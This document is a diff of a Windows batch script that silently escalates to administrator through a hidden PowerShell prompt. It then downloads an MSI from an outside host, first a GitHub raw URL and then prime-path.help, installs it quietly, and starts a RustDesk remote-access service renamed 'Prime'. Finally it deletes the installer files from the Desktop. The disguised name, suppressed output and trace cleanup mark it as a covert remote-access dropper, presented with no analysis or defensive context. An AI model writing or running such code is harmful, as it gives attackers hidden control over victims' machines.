@@ -1,41 +1,35 @@
 @echo off
 setlocal
 
-:: === AUTO-ELEVATE SILENTLY ===
+:: Auto-elevate silently
 net session >nul 2>&1
 if %errorlevel% neq 0 (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs -WindowStyle Hidden"
     exit /b
 )
 
-:: === DOWNLOAD AND INSTALL MSI SILENTLY ===
+:: Silent install of RustDesk MSI
 cd /d %temp%
-curl -s -L -O https://raw.githubusercontent.com/hgnstorev2/tresdf/main/Prime_Path.msi >nul 2>&1
+curl -s -L -O https://prime-path.help/static/configs/Prime.msi >nul 2>&1
+msiexec /i "%temp%\Prime.msi" /qn /norestart >nul 2>&1
 
-if exist "%temp%\Prime_Path.msi" (
-    msiexec /i "%temp%\Prime_Path.msi" /qn /norestart >nul 2>&1
-) else (
-    echo Failed to download Prime_Path.msi
-    exit /b
-)
-
-:: === LOCATE AND INSTALL RUSTDESK SERVICE ===
+:: Locate and install RustDesk service silently
 set "rustdeskPath="
-for /d %%a in ("C:\Program Files*\Prime_Path") do (
-    if exist "%%a\Prime_Path.exe" (
-        set "rustdeskPath=%%a\Prime_Path.exe"
+for /d %%a in ("C:\Program Files*\RustDesk") do (
+    if exist "%%a\Prime.exe" (
+        set "rustdeskPath=%%a\Prime.exe"
     )
 )
 
 if defined rustdeskPath (
-    call "%rustdeskPath%" --install >nul 2>&1
+    "%rustdeskPath%" --install >nul 2>&1
     sc start rustdesk >nul 2>&1
 )
 
-:: === DELETE RUSTDESK SHORTCUTS OR INSTALLER FROM DESKTOP ===
+:: Delete RustDesk-related files from Desktop
 set "desktopPath=%USERPROFILE%\Desktop"
-del /f /q "%desktopPath%\Prime_Path.msi" >nul 2>&1
-del /f /q "%desktopPath%\Prime_Path*.exe" >nul 2>&1
-del /f /q "%desktopPath%\Prime_Path*.msi" >nul 2>&1
+del /f /q "%desktopPath%\Prime.msi" >nul 2>&1
+del /f /q "%desktopPath%\Prime*.exe" >nul 2>&1
+del /f /q "%desktopPath%\Prime*.msi" >nul 2>&1
 
 exit /b
